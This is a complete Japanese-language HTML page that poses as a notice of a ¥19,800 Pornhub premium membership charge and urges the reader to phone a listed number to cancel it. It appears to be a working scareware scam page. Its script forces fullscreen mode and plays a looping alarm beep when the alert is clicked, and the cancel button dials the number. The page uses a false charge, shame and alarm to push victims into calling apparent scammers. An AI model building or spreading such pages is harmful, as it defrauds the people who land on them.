<!DOCTYPE html>
<html lang="ja">
<head>
<meta charset="UTF-8">
<title>⚠️ Pornhubプレミアム会員登録のお知らせ</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<style>
    html, body {
        margin: 0;
        padding: 0;
        height: 100%;
        width: 100%;
        background-color: black;
        font-family: Arial, sans-serif;
        overflow: hidden;
        color: #fff;
        position: relative;
        user-select: none;
    }

    #alertBox {
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background-color: #fff;
        color: #000;
        padding: 25px;
        border-radius: 10px;
        box-shadow: 0 0 25px red;
        text-align: center;
        width: 90%;
        max-width: 400px;
        z-index: 999;
        animation: shake 0.5s infinite alternate;
    }

    @keyframes shake {
        0% { transform: translate(-50%, -50%) rotate(-1deg); }
        100% { transform: translate(-50%, -50%) rotate(1deg); }
    }

    .alert-title {
        color: red;
        font-size: 22px;
        font-weight: bold;
        margin-bottom: 15px;
    }

    .alert-message {
        font-size: 16px;
        margin-bottom: 20px;
    }

    #callNowBtn {
        padding: 12px 25px;
        background-color: red;
        color: #fff;
        border: none;
        border-radius: 6px;
        font-size: 18px;
        cursor: pointer;
        margin-top: 10px;
        animation: pulse 1s infinite;
    }

    @keyframes pulse {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }
</style>
</head>
<body>

<div id="alertBox">
    <div class="alert-title">⚠️ Pornhubプレミアム会員登録が完了しました</div>
    <div class="alert-message">
        お客様のアカウントに対して<b>¥19,800</b>のPornhubプレミアム年間会員費が請求されました。<br><br>
        この購入に心当たりがない場合は、今すぐカスタマーサポートまでご連絡ください。<br><br>
        この請求はご利用明細書に<b>「メディアエンターテイメントサービス」</b>として表示されます。
    </div>
    <button id="callNowBtn">解約する</button>
    <div style="margin-top: 10px; font-size: 14px; color: red;">☎ +81-50-5050-1910</div>
</div>

<audio id="alertSound" loop>
    <source src="https://www.soundjay.com/button/beep-07.wav" type="audio/wav">
</audio>

<script>
const alertBox = document.getElementById('alertBox');
const audio = document.getElementById('alertSound');
const callNowBtn = document.getElementById('callNowBtn');

alertBox.addEventListener('click', () => {
    triggerFullScreen();
    audio.play();
});

callNowBtn.addEventListener('click', () => {
    window.location.href = "tel:+815050501910";
});

function triggerFullScreen() {
    const el = document.documentElement;
    if (el.requestFullscreen) {
        el.requestFullscreen();
    } else if (el.webkitRequestFullscreen) {
        el.webkitRequestFullscreen();
    } else if (el.msRequestFullscreen) {
        el.msRequestFullscreen();
    }
}
</script>

</body>
</html>
